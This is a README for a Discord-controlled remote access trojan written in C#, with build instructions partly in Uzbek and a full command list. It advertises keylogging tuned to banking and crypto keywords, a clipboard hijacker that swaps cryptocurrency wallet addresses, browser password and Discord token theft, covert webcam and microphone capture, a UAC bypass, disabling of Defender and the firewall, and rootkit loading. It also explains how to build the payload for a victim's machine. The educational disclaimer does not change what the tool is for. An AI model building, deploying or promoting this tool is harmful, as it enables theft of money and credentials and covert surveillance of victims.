# DiscordRAT 2.0 (Enhanced Edition)

Discord Remote Administration Tool fully written in C# (.NET Framework).
This tool allows full remote administration and control over target machines via a Discord Bot interface.

---

## 🚀 Key Features & Added Capabilities

### 🔹 Advanced Post-Exploitation & Automation
- **`!sysinfo`**: Displays comprehensive hardware, OS, CPU, RAM, GPU, Uptime, and detected Antivirus products.
- **`!keylogger`**: Starts/stops/dumps real-time keystroke logging with **automated keyword alerts** (*bank, binance, metamask, paypal, crypto, etc.*).
- **`!clipper`**: Automatically monitors clipboard for Bitcoin (`BTC`) or Ethereum (`ETH`) wallet addresses and swaps them with the operator's wallet address.
- **`!recordaudio`**: Records microphone audio in the background for $N$ seconds and uploads the `.wav` file to Discord.
- **Auto-Stealer on Session Join**: Automatically executes system audit and captures a initial screenshot as soon as a victim connects.
- **`!schedule`**: Background Task Scheduler to automatically run commands (e.g. `!schedule start 60 !screenshot`) at custom intervals.
- **`!liveview`**: Continuous automated screen view stream.
- **`!searchfile`**: Rapidly searches for files (e.g. `*wallet*`, `*.txt`, `*pass*`) across all connected fixed storage drives.
- **`!cleanlogs`**: Instantly wipes temporary audio recordings and resets memory buffers.
- **`!selfdestruct`**: Removes persistence registry keys, deletes executable via batch payload, and terminates execution cleanly.

### 🔹 Core Capabilities
- Remote Shell Command execution (`!shell`)
- Dynamic DLL loading (Password Stealer, Token Grabber, Webcam capture, Rootkit)
- Screenshot capture (`!screenshot`) & Wallpaper changer (`!wallpaper`)
- File Download & Upload (`!download`, `!upload`, `!uploadlink`)
- UAC Bypass, Task Manager Disabler, Windows Defender & Firewall Toggles
- Speech Synthesis (`!voice`) & Audio playback (`!audio`)
- Critical Process Escalation (`!critproc`) & BSOD trigger (`!bluescreen`)

---

## 🛠️ How to Build & Run (Qanday Yig'ish va Ishga Tushirish)

### 1. Discord Botni Tayyorlash
1. [Discord Developer Portal](https://discord.com/developers/applications) sahifasiga kiring va yangi Bot yarating.
2. Bot uchun **Bot Token** va barcha **Intents** (Message Content Intent, Server Members Intent, Presence Intent) sozlamalarini yoqing.
3. Botni o'zingizning Discord Serveringizga administrator huquqlari bilan taklif qiling.
4. Discord ilovasida `Developer Mode` ni yoqib, serveringiz ID-sini (**Guild ID**) nusxalab oling.

### 2. Loyihani Kompilyatsiya Qilish (Build Process)
1. Visual Studio orqali loyihani oching (`Discord rat.sln`).
2. `Discord rat` loyihasini **Release (x64)** rejimida kompilyatsiya qiling.
3. Hosil bo'lgan `Discord rat.exe` faylini `builder/bin/Release/Release/` yoki `builder.exe` joylashgan papkadagi `Release/` jildiga joylashtiring.
4. `builder` loyihasini kompilyatsiya qiling va `builder.exe` ni ishga tushiring.

### 3. Client Payload Yaratish (Building the Stub)
1. `builder.exe` dasturini oching.
2. **Discord Bot Token** va **Guild ID** maydonlariga mos ma'lumotlarni kiriting.
3. **Build Client** tugmasini bosing.
4. Dastur `Client-built.exe` faylini yaratib beradi.
5. Jabrlanuvchi kompyuterida `Client-built.exe` ishga tushirilganda, Discord serveringizda avtomatik ravishda yangi `session-N` kanali ochiladi.

---

## 📜 Full Command List (Barcha Buyruqlar Ro'yxati)

```text
--> !sysinfo        = Tizim, apparat (CPU, GPU, RAM) va Antivirus haqida ma'lumot
--> !keylogger      = Klaviaturani kuzatish / Sintaksis: !keylogger start | stop | dump
--> !clipper        = Kripto hamyon manzillarini almashtirish / Sintaksis: !clipper start <btc> <eth> | stop
--> !recordaudio    = Mikrofon orqali N sekund ovoz yozish / Sintaksis: !recordaudio 10
--> !schedule       = Rejalashtirilgan avto-buyruq / Sintaksis: !schedule start <sec> <command> | stop
--> !liveview       = Ekran rasmini har N sekundda yangilab turish / Sintaksis: !liveview start <sec> | stop
--> !searchfile     = Disk bo'ylab fayllarni qidirish / Sintaksis: !searchfile *wallet*
--> !cleanlogs      = Vaqtinchalik fayllar va loglarni tozalash
--> !selfdestruct   = Avto-startni o'chirish va faylni batyordamida izsiz yo'qotish
--> !grabtokens     = Barcha saqlangan Discord tokenlarini o'g'irlash
--> !password       = Brauzer saqlangan parollarni o'g'irlash
--> !screenshot     = Ekranning joriy rasmini olish
--> !shell          = Shell (cmd.exe) buyruqlarini bajarish / Sintaksis: !shell whoami
--> !download       = Faylni kompyuterdan yuklab olish
--> !upload         = Faylni kompyuterga yuklash (biriktirilgan fayl bilan)
--> !uploadlink     = Havola orqali faylni yuklab olish
--> !delete         = Faylni o'chirish
--> !getcams        = Veb-kameralar ro'yxatini olish
--> !selectcam      = Kamerani tanlash
--> !webcampic      = Tanlangan veb-kameradan rasm olish
--> !message        = Ekranda xabar oynasini ko'rsatish
--> !voice          = Ovozli matn o'qish (Text-to-Speech)
--> !wallpaper      = Ish stoli rasmini o'zgartirish
--> !clipboard      = Nusxalangan matnni (Clipboard) olish
--> !idletime       = Foydalanuvchining harakatsizlik vaqtini olish
--> !block / !unblock = Sitchqoncha va klaviaturani bloklash/ochish
--> !uacbypass      = UAC ni chetlab o'tib admin huquqini olishga urinish
--> !shutdown / !restart / !logoff = Tizimni o'chirish / qayta yuklash / tizimdan chiqish
--> !bluescreen     = Tizimda ko'k ekran (BSOD) chiqarish
--> !disabledefender = Windows Defender-ni o'chirish (Admin)
--> !disablefirewall = Windows Firewall-ni o'chirish (Admin)
--> !disabletaskmgr / !enabletaskmgr = Task Manager-ni bloklash / ochish
--> !critproc / !uncritproc = Dasturni kritik protsessga aylantirish
--> !startup        = Avto-yuklanishga qo'shish
--> !rootkit / !unrootkit = r77 Rootkit yuklash / olib tashlash
--> !help           = Yordam menyusini ko'rsatish
```

---

## ⚠️ Disclaimer
This tool is created strictly for **educational and authorized security testing purposes**. The developers and contributors assume no liability and are not responsible for any misuse or damage caused by this program.
